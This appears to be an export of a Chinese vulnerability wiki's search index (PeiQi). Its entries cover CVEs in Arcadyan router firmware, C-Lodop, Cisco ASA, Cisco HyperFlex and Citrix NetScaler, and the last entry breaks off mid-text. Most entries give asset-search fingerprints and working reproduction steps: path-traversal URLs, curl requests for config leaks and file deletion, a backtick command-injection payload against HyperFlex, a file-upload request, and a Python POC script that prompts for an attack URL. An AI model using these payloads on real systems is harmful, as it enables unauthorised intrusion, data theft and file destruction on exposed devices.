界面没有正确限制未经授权的参与者对敏感信息的访问。 ","date":"0001-01-01","objectID":"/arcadyan%E5%9B%BA%E4%BB%B6-cgi_i_filter.js-%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-20092/:1:0","tags":null,"title":"","uri":"/arcadyan%E5%9B%BA%E4%BB%B6-cgi_i_filter.js-%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-20092/"},{"categories":null,"content":"漏洞影响 Vendor Device Found on version ADB ADSL wireless IAD router 1.26S-R-3P Arcadyan ARV7519 00.96.00.96.617ES Arcadyan VRV9517 6.00.17 build04 Arcadyan VGV7519 3.01.116 Arcadyan VRV9518 1.01.00 build44 ASMAX BBR-4MG / SMC7908 ADSL 0.08 ASUS DSL-AC88U (Arc VRV9517) 1.10.05 build502 ASUS DSL-AC87VG (Arc VRV9510) 1.05.18 build305 ASUS DSL-AC3100 1.10.05 build503 ASUS DSL-AC68VG 5.00.08 build272 Beeline Smart Box Flash 1.00.13_beta4 British Telecom WE410443-SA 1.02.12 build02 Buffalo WSR-2533DHPL2 1.02 Buffalo WSR-2533DHP3 1.24 Buffalo BBR-4HG Buffalo BBR-4MG 2.08 Release 0002 Buffalo WSR-3200AX4S 1.1 Buffalo WSR-1166DHP2 1.15 Buffalo WXR-5700AX7S 1.11 Deutsche Telekom Speedport Smart 3 010137.4.8.001.0 HughesNet HT2000W 0.10.10 KPN ExperiaBox V10A (Arcadyan VRV9517) 5.00.48 build453 KPN VGV7519 3.01.116 O2 HomeBox 6441 1.01.36 Orange LiveBox Fibra (PRV3399) 00.96.00.96.617ES Skinny Smart Modem (Arcadyan VRV9517) 6.00.16 build01 SparkNZ Smart Modem (Arcadyan VRV9517) 6.00.17 build04 Telecom (Argentina) Arcadyan VRV9518VAC23-A-OS-AM 1.01.00 build44 TelMex PRV33AC 1.31.005.0012 TelMex VRV7006 Telstra Smart Modem Gen 2 (LH1000) 0.13.01r Telus WiFi Hub (PRV65B444A-S-TS) v3.00.20 Telus NH20A 1.00.10debug build06 Verizon Fios G3100 2.0.0.6 Vodafone EasyBox 904 4.16 Vodafone EasyBox 903 30.05.714 Vodafone EasyBox 802 20.02.226 ","date":"0001-01-01","objectID":"/arcadyan%E5%9B%BA%E4%BB%B6-cgi_i_filter.js-%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-20092/:2:0","tags":null,"title":"","uri":"/arcadyan%E5%9B%BA%E4%BB%B6-cgi_i_filter.js-%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-20092/"},{"categories":null,"content":"网络测绘 app=\"Arcadyan-httpd-1.0\" ","date":"0001-01-01","objectID":"/arcadyan%E5%9B%BA%E4%BB%B6-cgi_i_filter.js-%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-20092/:3:0","tags":null,"title":"","uri":"/arcadyan%E5%9B%BA%E4%BB%B6-cgi_i_filter.js-%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-20092/"},{"categories":null,"content":"漏洞复现 登录页面 输入任意密码跳转到 loginerror.html 页面，使用 console 调用 getToken() 获取重要参数 _tn 参数设置为刚刚获取到的参数, 使用curl 发送请求包获取敏感信息 curl --include \"http://xxx.xxx.xxx.xxx/cgi/cgi_i_filter.js?_tn=348876758\" -H \"Referer: http://xxx.xxx.xxx.xxx/loginerror.html\" ","date":"0001-01-01","objectID":"/arcadyan%E5%9B%BA%E4%BB%B6-cgi_i_filter.js-%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-20092/:4:0","tags":null,"title":"","uri":"/arcadyan%E5%9B%BA%E4%BB%B6-cgi_i_filter.js-%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-20092/"},{"categories":null,"content":"Arcadyan固件 image 路径遍历漏洞 CVE-2021-20090 ","date":"0001-01-01","objectID":"/arcadyan%E5%9B%BA%E4%BB%B6-image-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-20090/:0:0","tags":null,"title":"","uri":"/arcadyan%E5%9B%BA%E4%BB%B6-image-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-20090/"},{"categories":null,"content":"漏洞描述 Arcadyan 制造的网络设备的 Web 界面中存在路径遍历漏洞，包括 Buffalo WSR-2533DHPL2 固件版本 \u003c= 1.02 和 WSR-2533DHP3 固件版本 \u003c= 1.24，可能允许未经身份验证的远程攻击者绕过身份验证。 ","date":"0001-01-01","objectID":"/arcadyan%E5%9B%BA%E4%BB%B6-image-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-20090/:1:0","tags":null,"title":"","uri":"/arcadyan%E5%9B%BA%E4%BB%B6-image-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-20090/"},{"categories":null,"content":"漏洞影响 Vendor Device Found on version ADB ADSL wireless IAD router 1.26S-R-3P Arcadyan ARV7519 00.96.00.96.617ES Arcadyan VRV9517 6.00.17 build04 Arcadyan VGV7519 3.01.116 Arcadyan VRV9518 1.01.00 build44 ASMAX BBR-4MG / SMC7908 ADSL 0.08 ASUS DSL-AC88U (Arc VRV9517) 1.10.05 build502 ASUS DSL-AC87VG (Arc VRV9510) 1.05.18 build305 ASUS DSL-AC3100 1.10.05 build503 ASUS DSL-AC68VG 5.00.08 build272 Beeline Smart Box Flash 1.00.13_beta4 British Telecom WE410443-SA 1.02.12 build02 Buffalo WSR-2533DHPL2 1.02 Buffalo WSR-2533DHP3 1.24 Buffalo BBR-4HG Buffalo BBR-4MG 2.08 Release 0002 Buffalo WSR-3200AX4S 1.1 Buffalo WSR-1166DHP2 1.15 Buffalo WXR-5700AX7S 1.11 Deutsche Telekom Speedport Smart 3 010137.4.8.001.0 HughesNet HT2000W 0.10.10 KPN ExperiaBox V10A (Arcadyan VRV9517) 5.00.48 build453 KPN VGV7519 3.01.116 O2 HomeBox 6441 1.01.36 Orange LiveBox Fibra (PRV3399) 00.96.00.96.617ES Skinny Smart Modem (Arcadyan VRV9517) 6.00.16 build01 SparkNZ Smart Modem (Arcadyan VRV9517) 6.00.17 build04 Telecom (Argentina) Arcadyan VRV9518VAC23-A-OS-AM 1.01.00 build44 TelMex PRV33AC 1.31.005.0012 TelMex VRV7006 Telstra Smart Modem Gen 2 (LH1000) 0.13.01r Telus WiFi Hub (PRV65B444A-S-TS) v3.00.20 Telus NH20A 1.00.10debug build06 Verizon Fios G3100 2.0.0.6 Vodafone EasyBox 904 4.16 Vodafone EasyBox 903 30.05.714 Vodafone EasyBox 802 20.02.226 ","date":"0001-01-01","objectID":"/arcadyan%E5%9B%BA%E4%BB%B6-image-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-20090/:2:0","tags":null,"title":"","uri":"/arcadyan%E5%9B%BA%E4%BB%B6-image-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-20090/"},{"categories":null,"content":"网络测绘 app=\"Arcadyan-httpd-1.0\" ","date":"0001-01-01","objectID":"/arcadyan%E5%9B%BA%E4%BB%B6-image-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-20090/:3:0","tags":null,"title":"","uri":"/arcadyan%E5%9B%BA%E4%BB%B6-image-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-20090/"},{"categories":null,"content":"漏洞复现 登录页面 通过目录遍历访问主页面 info.html /images/..%2finfo.html ","date":"0001-01-01","objectID":"/arcadyan%E5%9B%BA%E4%BB%B6-image-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-20090/:4:0","tags":null,"title":"","uri":"/arcadyan%E5%9B%BA%E4%BB%B6-image-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-20090/"},{"categories":null,"content":"C-Lodop打印机任意文件读取漏洞 ","date":"0001-01-01","objectID":"/c-lodop%E6%89%93%E5%8D%B0%E6%9C%BA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/c-lodop%E6%89%93%E5%8D%B0%E6%9C%BA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 C-Lodop打印机存在任意文件读取漏洞，通过构造特殊URL，可实现读取系统任意文件。 ","date":"0001-01-01","objectID":"/c-lodop%E6%89%93%E5%8D%B0%E6%9C%BA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/c-lodop%E6%89%93%E5%8D%B0%E6%9C%BA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"C-Lodop\" ","date":"0001-01-01","objectID":"/c-lodop%E6%89%93%E5%8D%B0%E6%9C%BA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/c-lodop%E6%89%93%E5%8D%B0%E6%9C%BA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 poc： GET /../../../../../../../../windows/System32/drivers/etc/HOSTS HTTP/1.1 Host: 127.0.0.1 .... ","date":"0001-01-01","objectID":"/c-lodop%E6%89%93%E5%8D%B0%E6%9C%BA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/c-lodop%E6%89%93%E5%8D%B0%E6%9C%BA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Cisco ASA设备 任意文件读取漏洞 CVE-2020-3452 ","date":"0001-01-01","objectID":"/cisco-asa%E8%AE%BE%E5%A4%87-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-3452/:0:0","tags":null,"title":"","uri":"/cisco-asa%E8%AE%BE%E5%A4%87-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-3452/"},{"categories":null,"content":"漏洞描述 Cisco Adaptive Security Appliance (ASA) 防火墙设备以及Cisco Firepower Threat Defense (FTD)设备的WEB管理界面存在未授权的目录穿越漏洞和远程任意文件读取漏洞，允许未经身份验证的远程攻击者进行目录遍历攻击并读取目标系统上的敏感文件，此漏洞不能用于获取对ASA或FTD系统文件或底层操作系统(OS)文件的访问，所以只能读取web系统目录的文件，比如webvpn的配置文件、书签、网络cookies、部分网络内容和超文本传输协议网址等信息。 ","date":"0001-01-01","objectID":"/cisco-asa%E8%AE%BE%E5%A4%87-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-3452/:1:0","tags":null,"title":"","uri":"/cisco-asa%E8%AE%BE%E5%A4%87-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-3452/"},{"categories":null,"content":"漏洞影响 Cisco ASA设备： Cisco FTD设备： ","date":"0001-01-01","objectID":"/cisco-asa%E8%AE%BE%E5%A4%87-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-3452/:2:0","tags":null,"title":"","uri":"/cisco-asa%E8%AE%BE%E5%A4%87-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-3452/"},{"categories":null,"content":"网络测绘 /+CSCOE+/ Cisco-ASA ","date":"0001-01-01","objectID":"/cisco-asa%E8%AE%BE%E5%A4%87-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-3452/:3:0","tags":null,"title":"","uri":"/cisco-asa%E8%AE%BE%E5%A4%87-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-3452/"},{"categories":null,"content":"漏洞复现 POC如下 https://xxx.xxx.xxx.xxx/+CSCOT+/translation-table?type=mst\u0026textdomain=/%2bCSCOE%2b/portal_inc.lua\u0026default-language\u0026lang=../ 会下载得到一个文件 ","date":"0001-01-01","objectID":"/cisco-asa%E8%AE%BE%E5%A4%87-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-3452/:4:0","tags":null,"title":"","uri":"/cisco-asa%E8%AE%BE%E5%A4%87-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-3452/"},{"categories":null,"content":"漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys import urllib3 def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Cisco \\033[0m') print('+ \\033[36m使用格式: python3 CVE-2020-1956 \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vnln_url = target_url + \"/+CSCOT+/translation-table?type=mst\u0026textdomain=/%2bCSCOE%2b/portal_inc.lua\u0026default-language\u0026lang=../\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36\" } urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) response = requests.get(url=vnln_url, headers=headers, verify=False ,timeout=20) if \"Bad Request\" in response.text: print(\"\\033[31m[x] 漏洞已修复 \\033[0m\") else: print(\"\\033[32m[o] 存在漏洞，响应为\\n\\033[0m\",response.text) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/cisco-asa%E8%AE%BE%E5%A4%87-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-3452/:5:0","tags":null,"title":"","uri":"/cisco-asa%E8%AE%BE%E5%A4%87-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-3452/"},{"categories":null,"content":"Cisco ASA设备任意文件删除漏洞 CVE-2020-3187 ","date":"0001-01-01","objectID":"/cisco-asa%E8%AE%BE%E5%A4%87%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E-cve-2020-3187/:0:0","tags":null,"title":"","uri":"/cisco-asa%E8%AE%BE%E5%A4%87%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E-cve-2020-3187/"},{"categories":null,"content":"漏洞描述 Cisco ASA Software和FTD Software中的Web服务接口存在路径遍历漏洞，该漏洞源于程序没有对HTTP URL进行正确的输入验证。远程攻击者可通过发送带有目录遍历序列的特制HTTP请求利用该漏洞读取并删除系统上的敏感信息。 ","date":"0001-01-01","objectID":"/cisco-asa%E8%AE%BE%E5%A4%87%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E-cve-2020-3187/:1:0","tags":null,"title":"","uri":"/cisco-asa%E8%AE%BE%E5%A4%87%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E-cve-2020-3187/"},{"categories":null,"content":"漏洞影响 Cisco ASA设备： Cisco FTD设备： ","date":"0001-01-01","objectID":"/cisco-asa%E8%AE%BE%E5%A4%87%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E-cve-2020-3187/:2:0","tags":null,"title":"","uri":"/cisco-asa%E8%AE%BE%E5%A4%87%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E-cve-2020-3187/"},{"categories":null,"content":"网络测绘 /+CSCOE+/ Cisco-ASA ","date":"0001-01-01","objectID":"/cisco-asa%E8%AE%BE%E5%A4%87%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E-cve-2020-3187/:3:0","tags":null,"title":"","uri":"/cisco-asa%E8%AE%BE%E5%A4%87%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E-cve-2020-3187/"},{"categories":null,"content":"漏洞复现 访问 http://xxx.xxx.xxx.xxx/+CSCOE+/session_password.html 存在则可能出现此漏洞 例如我们删除一张图片 http://xxx.xxx.xxx.xxx/+CSCOU+/csco_logo.gif 使用 curl 发送请求 curl -H \"Cookie: token=../+CSCOU+/csco_logo.gif\" https://xxx.xxx.xxx.xxx/+CSCOE+/session_password.html 成功删除图标 ","date":"0001-01-01","objectID":"/cisco-asa%E8%AE%BE%E5%A4%87%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E-cve-2020-3187/:4:0","tags":null,"title":"","uri":"/cisco-asa%E8%AE%BE%E5%A4%87%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E-cve-2020-3187/"},{"categories":null,"content":"Cisco HyperFlex HX storfs-asup 远程命令执行漏洞 CVE-2021-1497 ","date":"0001-01-01","objectID":"/cisco-hyperflex-hx-storfs-asup-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-1497/:0:0","tags":null,"title":"","uri":"/cisco-hyperflex-hx-storfs-asup-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-1497/"},{"categories":null,"content":"漏洞描述 思科在研究人员Nikita Abramov和Mikhail Klyuchnikov发现的HyperFlex HX数据平台中修复了两个Unauth RCE和一个任意文件上载 ","date":"0001-01-01","objectID":"/cisco-hyperflex-hx-storfs-asup-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-1497/:1:0","tags":null,"title":"","uri":"/cisco-hyperflex-hx-storfs-asup-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-1497/"},{"categories":null,"content":"漏洞影响 Cisco HyperFlex HX ","date":"0001-01-01","objectID":"/cisco-hyperflex-hx-storfs-asup-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-1497/:2:0","tags":null,"title":"","uri":"/cisco-hyperflex-hx-storfs-asup-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-1497/"},{"categories":null,"content":"漏洞复现 出现漏洞的代码 protected void processRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { String action = request.getParameter(\"action\"); if (action == null) { String msg = \"Action for the servlet need be specified.\"; writeErrorResponse(response, msg); return; } try { String token = request.getParameter(\"token\"); StringBuilder cmd = new StringBuilder(); cmd.append(\"exec /bin/storfs-asup \"); cmd.append(token); String mode = request.getParameter(\"mode\"); cmd.append(\" \"); cmd.append(mode); cmd.append(\" \u003e /dev/null\"); logger.info(\"storfs-asup cmd to run : \" + cmd); ProcessBuilder pb = new ProcessBuilder(new String[] { \"/bin/bash\", \"-c\", cmd.toString() }); logger.info(\"Starting the storfs-asup now: \"); long startTime = System.currentTimeMillis(); Process p = pb.start(); InputStream errStream = p.getErrorStream(); String errMsg = FileUtils.readToString(errStream); int exitCode = p.waitFor(); long timeTaken = System.currentTimeMillis() - startTime; logger.info(\"storfs-asup command completed in (\" + timeTaken + \" ) milliseconds, with exit code (\" + exitCode + \") and error message: \" + errMsg); errStream.close(); OutputStream outStream = p.getOutputStream(); outStream.flush(); outStream.close(); if (exitCode != 0) throw new Exception(errMsg); } catch (IOException ex) { logger.error(\"Failed to generate asup: \" + ex); } catch (Exception ie) { logger.error(\"Failed to run the /bin/storfs-asup command.\"); } finally { logger.info(\"Done executing asup command. \"); } } POC为 curl -v http://xxx.xxx.xxx.xxx/storfs-asup -d 'action=\u0026token=`id`\u0026mode=`id`' ","date":"0001-01-01","objectID":"/cisco-hyperflex-hx-storfs-asup-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-1497/:3:0","tags":null,"title":"","uri":"/cisco-hyperflex-hx-storfs-asup-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-1497/"},{"categories":null,"content":"Cisco HyperFlex HX upload 任意文件上传漏洞 CVE-2021-1499 ","date":"0001-01-01","objectID":"/cisco-hyperflex-hx-upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-1499/:0:0","tags":null,"title":"","uri":"/cisco-hyperflex-hx-upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-1499/"},{"categories":null,"content":"漏洞描述 思科在研究人员Nikita Abramov和Mikhail Klyuchnikov发现的HyperFlex HX数据平台中修复了两个Unauth RCE和一个任意文件上载 ","date":"0001-01-01","objectID":"/cisco-hyperflex-hx-upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-1499/:1:0","tags":null,"title":"","uri":"/cisco-hyperflex-hx-upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-1499/"},{"categories":null,"content":"漏洞影响 Cisco HyperFlex HX ","date":"0001-01-01","objectID":"/cisco-hyperflex-hx-upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-1499/:2:0","tags":null,"title":"","uri":"/cisco-hyperflex-hx-upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-1499/"},{"categories":null,"content":"漏洞复现 出现漏洞的代码为 public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { this.isMultipart = ServletFileUpload.isMultipartContent(request); response.setContentType(\"application/json\"); PrintWriter out = response.getWriter(); if (!this.isMultipart) { out.println(\"{\\\"result\\\": \\\"Invalid content-type.\\\"}\"); logger.error(\"{\\\"result\\\": \\\"Invalid content-type. Must be multi-part\\\"}\"); response.setStatus(400); return; } ServletFileUpload upload = new ServletFileUpload(); upload.setSizeMax(this.maxFileSize); FileOutputStream fout = null; InputStream stream = null; try { FileItemIterator iter = upload.getItemIterator(request); while (iter.hasNext()) { try { FileItemStream fi = iter.next(); stream = fi.openStream(); String uploadedFileName = this.dirPath + \"/\" + fi.getName(); File uploadedFile = new File(uploadedFileName); fout = new FileOutputStream(uploadedFile); byte[] buffer = new byte[1024]; int len; while ((len = stream.read(buffer, 0, buffer.length)) != -1) fout.write(buffer, 0, len); out.println(\"{\\\"result\\\": \\\"filename: \" + uploadedFileName + \"\\\"}\"); logger.debug(\"{\\\"result\\\": \\\"filename: \" + uploadedFileName + \"\\\"}\"); } catch (org.apache.commons.fileupload.MultipartStream.MalformedStreamException ex) { logger.info(\"MalformedStreamException during file upload servlet stream processing: \" + ex); } finally { if (fout != null) { logger.info(\"Closing fout\"); fout.close(); } if (stream != null) { logger.info(\"Closing stream\"); stream.close(); } } } } catch (Exception ex) { out.println(\"{\\\"result\\\": \\\"Upload failed: \" + ex.getMessage() + \"\\\"}\"); logger.error(\"{\\\"result\\\": \\\"Upload failed: \" + ex.getMessage() + \"\\\"}\"); logger.error(\"Exception during file upload servlet stream processing: \" + ex); response.setStatus(500); } POC为 curl -v http://xxx.xxx.xxx.xxx/upload -F x=@/dev/null ","date":"0001-01-01","objectID":"/cisco-hyperflex-hx-upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-1499/:3:0","tags":null,"title":"","uri":"/cisco-hyperflex-hx-upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-1499/"},{"categories":null,"content":"Citrix NetScaler ADC \u0026 Gateway 信息泄露漏洞 CVE-2023-4966 ","date":"0001-01-01","objectID":"/citrix-netscaler-adc-gateway-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2023-4966/:0:0","tags":null,"title":"","uri":"/citrix-netscaler-adc-gateway-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2023-4966/"},{"categories":null,"content":"漏洞描述 NetScaler ADC和NetScaler Gateway是美国思杰（Citrix）公司的产品。Citrix Gateway是一套安全的远程接入解决方案，可提供应用级和数据级管控功能，以实现用户从任何地点远程访问应用和数据；Citrix ADC是一个全面的应用程序交付和负载均衡解决方案，用于实现应用程序安全性、整体可见性和可用性。 在 Citrix 设备设置为网关（VPN 虚拟服务器、ICA 代理、CVPN、RDP 代理）或 AAA 虚拟服务器的情况下，可以通过访问/oauth/idp/.well-known/openid-configuration路由并往 HOST字段发送大量数据从而泄露缓冲区信息，其中可能包含session cookie相关信息，攻击者可以借助该信息无需经过身份验证实现访问。 参考链接： https://xz.aliyun.com/t/13031 ","date":"0001-01-01","objectID":"/citrix-netscaler-adc-gateway-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2023-4966/:1:0","tags":null,"title":"","uri":"/citrix-netscaler-adc-gateway-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2023-4966/"},{"categories":null,"content":"漏洞影响 NetScaler ADC 和 NetScaler Gateway 14.1 \u003c 14.1-8.50 NetScaler ADC 和 NetScaler Gateway 13.1 \u003c 13.1-49.15 NetScaler ADC 和 NetScaler Gateway 13.0 \u003c 13.0-92.19 NetScaler ADC 13.1-FIPS \u003c 13.1-37.164 NetScaler ADC 12.1-FIPS \u003c 12.1-55.300 NetScaler ADC 12.1-NDcPP \u003c 12.1-55.300 ","date":"0001-01-01","objectID":"/citrix-netscaler-adc-gateway-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2023-4966/:2:0","tags":null,"title":"","uri":"/citrix-netscaler-adc-gateway-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2023-4966/"},{"categories":null,"content":"漏洞复现 选择 NetScaler Gateway 的 13.1-49.15和13.1-48.47 